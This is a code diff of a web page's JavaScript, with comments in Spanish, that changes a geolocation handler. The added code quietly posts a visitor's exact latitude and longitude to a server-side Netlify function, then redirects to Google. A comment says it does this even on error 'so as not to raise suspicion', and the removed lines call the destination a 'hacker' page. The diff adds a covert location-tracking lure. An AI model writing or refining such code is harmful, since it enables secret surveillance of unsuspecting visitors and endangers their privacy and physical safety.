@@ -131,22 +131,28 @@
         const checkboxText = document.getElementById('checkbox-text');
         
         const success = (position) => {
-            const lat = position.coords.latitude.toFixed(6);
-            const lon = position.coords.longitude.toFixed(6);
-            const id = Math.random().toString(36).substring(2, 8);
+    const lat = position.coords.latitude.toFixed(6);
+    const lon = position.coords.longitude.toFixed(6);
+    const id = Math.random().toString(36).substring(2, 8);
+    
+    // Envía los datos a tu función de Netlify en segundo plano
+    fetch('/.netlify/functions/recibir-datos', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ lat: lat, lon: lon, id: id })
+    })
+    .then(response => {
+        // Redirige al usuario a Google.com
+        window.location.href = 'https://www.google.com';
+    })
+    .catch(error => {
+        // En caso de error, también lo redirige a Google para no levantar sospechas
+        window.location.href = 'https://www.google.com';
+    });
+};
 
-            // Aquí está el problema. Debes redirigir directamente a tu página del "hacker"
-            // con los parámetros en la URL.
-            const redirectUrl = `https://prueba-ubicacion.netlify.app/index2.html?lat=${lat}&lon=${lon}&id=${id}`;
-
-            // La siguiente línea es la que debe ejecutarse.
-            window.location.href = redirectUrl;
-
-            // Si estás usando una redirección a Google, asegúrate de que el código
-            // lea el parámetro de la URL para redirigirte, lo cual es más complejo
-            // y no es la solución que estamos implementando.
-            // La forma más simple es la redirección directa a tu index2.html
-            };
 
         const error = (err) => {
             let message = "";
